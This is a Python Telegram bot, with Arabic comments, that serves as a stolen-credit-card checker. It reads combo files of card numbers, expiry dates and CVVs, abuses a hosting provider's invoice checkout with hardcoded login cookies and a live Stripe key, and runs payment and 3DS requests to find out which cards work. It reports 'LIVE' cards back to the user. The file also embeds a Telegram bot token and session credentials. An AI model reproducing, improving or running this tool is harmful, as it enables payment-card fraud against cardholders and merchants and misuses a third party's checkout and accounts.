#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
import re
from bs4 import BeautifulSoup
import urllib3
import time
import threading

# إخفاء تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379
INVOICE_ID = 260528

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}

class StripeChecker:
    def __init__(self):
        self.cookies = {
    '_gcl_au': '1.1.1086970495.1761294272',
    '_ga': 'GA1.1.1641871625.1761294273',
    '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
    'inputNotes': '',
    'inputHowDidYouFind': '',
    'howDidRewards': '',
    'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
    'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
    'VsysFirstVisit': '1761307789',
    '_ga_248YG9EFT7': 'GS2.1.s1761307804$o4$g1$t1761309294$j52$l0$h2017258656',
        }
        self.invoice_id = INVOICE_ID
    
    def fetch_invoice_data(self):
        """جلب بيانات الفاتورة والكوكيز من vsys.host"""
        url = f"https://vsys.host/viewinvoice.php?id={self.invoice_id}"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        }
        
        try:
            session = requests.Session()
            response = session.get(url, headers=headers, cookies=self.cookies, timeout=20, verify=False)
            response.raise_for_status()
            
            new_cookies = session.cookies.get_dict()
            stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
            stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
            session_id = m.group(0).split('/pay/')[1].split('#')[0] if m and '/pay/' in m.group(0) else ''
            
            total_row = soup.find('tr', class_='total-row')
            if not total_row:
                total_row = soup.select_one('tr:contains("Total")')
            if not total_row:
                return None, None, None, None, "❌ لم يتم العثور على المبلغ الإجمالي"
            
            total_amount_text = total_row.find_all('td')[1].text.replace('$', '').strip()
            total_amount = int(float(total_amount_text) * 100) if total_amount_text else 0
            
            if not session_id or not total_amount:
                return None, None, None, None, "❌ فشل جلب session_id أو المبلغ"
            
            return session_id, total_amount, stripe_mid, stripe_sid, None
        except Exception as e:
            return None, None, None, None, f"❌ خطأ في الاتصال: {str(e)[:100]}"
    
    def check_card(self, card_details):
        """فحص بطاقة واحدة"""
        start_time = time.time()
        session_id, total_amount, stripe_mid, stripe_sid, error = self.fetch_invoice_data()
        
        if error:
            return {
                'status': 'ERROR',
                'message': error,
                'details': {},
                'time': round(time.time() - start_time, 2)
            }
        
        try:
            parts = card_details.strip().split('|')
            if len(parts) != 4:
                return {
                    'status': 'ERROR',
                    'message': '❌ صيغة خاطئة',
                    'details': {},
                    'time': 0
                }
            
            card_number, exp_month, exp_year, cvc = parts
            
            headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://checkout.stripe.com',
                'referer': 'https://checkout.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36',
            }

            # إنشاء طريقة دفع
            data_pm = (
                f'type=card&card[number]={card_number}&card[cvc]={cvc}&'
                f'card[exp_month]={exp_month}&card[exp_year]={exp_year}&'
                'billing_details[name]=Card+details+saad&'
                'billing_details[email]=renes98352%40neuraxo.com&'
                'billing_details[address][country]=IT&'
                f'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={stripe_mid}&sid={stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            )

            r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_pm, timeout=20)
            pm_res = r1.json()
            
            if 'id' not in pm_res:
                error_msg = pm_res.get('error', {}).get('message', 'خطأ غير معروف')
                return {
                    'status': 'DECLINED',
                    'message': f"❌ {error_msg}",
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }

            pm_id = pm_res['id']
            
            # تأكيد الدفع
            data_confirm = (
                f'eid=NA&payment_method={pm_id}&expected_amount={total_amount}&'
                f'last_displayed_line_item_group_details[subtotal]={total_amount}&'
                'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
                f'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={stripe_mid}&sid={stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            )

            r2 = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                headers=headers, data=data_confirm, timeout=20
            )
            
            confirm_res = r2.json()
            
            if 'payment_intent' not in confirm_res:
                return {
                    'status': 'ERROR',
                    'message': '⚠️ لا يوجد payment_intent',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            
            pi = confirm_res['payment_intent']
            status = pi.get('status', 'unknown')
            
            if status == 'requires_action':
                next_action = pi.get('next_action', {})
                if next_action.get('type') == 'use_stripe_sdk':
                    use_stripe_sdk = next_action.get('use_stripe_sdk', {})
                    source_id = use_stripe_sdk.get('three_d_secure_2_source')
                    
                    if not source_id:
                        return {
                            'status': 'ERROR',
                            'message': '❌ لا يوجد 3DS source',
                            'details': {},
                            'time': round(time.time() - start_time, 2)
                        }
                    
                    data_3ds = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', headers=headers, data=data_3ds, timeout=20)
                    tds_res = r3.json()
                    
                    ares = tds_res.get('ares', {})
                    trans_status = ares.get('transStatus', '?')
                    
                    status_map = {
                        'N': ('LIVE', '✅ Live - transStatus: N'),
                        'Y': ('APPROVED', '✅ Approved - transStatus: Y'),
                        'R': ('DECLINED', '❌ Rejected - transStatus: R'),
                        'C': ('OTP', '🔐 Challenge - transStatus: C')
                    }
                    
                    result_status, message = status_map.get(trans_status, ('ERROR', f'ℹ️ transStatus: {trans_status}'))
                    return {
                        'status': result_status,
                        'message': message,
                        'details': {'trans_status': trans_status},
                        'time': round(time.time() - start_time, 2)
                    }
            
            elif status == 'succeeded':
                return {
                    'status': 'LIVE',
                    'message': '✅ Approved Direct',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            else:
                error = pi.get('last_payment_error', {})
                msg = error.get('message', error.get('code', status))
                return {
                    'status': 'DECLINED',
                    'message': f"❌ {msg}",
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }

        except Exception as e:
            return {
                'status': 'ERROR',
                'message': f"❌ خطأ: {str(e)[:100]}",
                'details': {},
                'time': round(time.time() - start_time, 2)
            }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    username = message.from_user.first_name or "User"
    welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        
        cards = []
        for line in lines:
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append(line)
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    if user_id not in user_cards or not user_cards[user_id]:
        bot.answer_callback_query(call.id, "❌ No cards loaded!")
        return
    
    if checking_status.get(user_id, False):
        bot.answer_callback_query(call.id, "⚠️ Already checking!")
        return
    
    checking_status[user_id] = True
    bot.answer_callback_query(call.id, "✅ Starting check...")
    
    thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
    thread.start()

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text="⏳ Initializing checker...\n🔑 Getting session data..."
    )
    
    checker = StripeChecker()
    live = approved = otp = declined = errors = checked = 0
    start_time = time.time()
    
    for card in cards:
        if not checking_status.get(user_id, True):
            break
        
        checked += 1
        result = checker.check_card(card)
        
        # إنشاء لوحة التحكم
        keyboard = types.InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Approved ✔ ➜ [{approved}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
            types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
            types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
        )
        
        if result['status'] == 'LIVE':
            live += 1
            parts = card.split('|')
            msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
            bot.send_message(user_id, msg)
        elif result['status'] == 'APPROVED':
            approved += 1
        elif result['status'] == 'OTP':
            otp += 1
        elif result['status'] == 'DECLINED':
            declined += 1
        else:
            errors += 1
        
        # عرض التقدم
        progress = int((checked / total) * 20)
        progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
        elapsed = time.time() - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        eta = (total - checked) / speed if speed > 0 else 0
        
        card_parts = card.split('|')
        card_display = f"{card_parts[0][:6]}...{card_parts[0][-4:]}" if len(card_parts[0]) >= 10 else card_parts[0]
        
        try:
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=message.message_id,
                text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card_display}
</b>""",
                reply_markup=keyboard
            )
        except:
            pass
        
        time.sleep(5)  # تأخير 5 ثواني بين كل بطاقة
    
    # النتيجة النهائية
    total_time = time.time() - start_time
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=message.message_id,
        text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ Approved ✔: {approved}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    )
    
    checking_status[user_id] = False
    del user_cards[user_id]

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    user_id = call.from_user.id
    checking_status[user_id] = False
    bot.answer_callback_query(call.id, "✅ Checking stopped!")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Only LIVE cards sent

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['status'])
def status_message(message):
    status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe 3DS
🔥 Speed: Fast
✅ Accuracy: High
🌐 Server: Active
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
    bot.send_message(message.chat.id, status_text)

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    text = message.text.strip()
    if '|' in text and len(text.split('|')) == 4:
        user_cards[message.from_user.id] = [text]
        checking_status[message.from_user.id] = False
        
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        parts = text.split('|')
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Stripe 3DS
⚡ Status: Ready
</b>""",
            reply_markup=keyboard
        )
    else:
        bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV
Example: 5127740080852575|03|2027|825
</b>""")

if __name__ == "__main__":
    print("🚀 Starting Stripe Checker Bot...")
    print(f"👤 Admin ID: {ADMIN_ID}")
    print(f"🧾 Invoice ID: {INVOICE_ID}")
    print("✅ Bot is running...\n")
    bot.polling(none_stop=True)
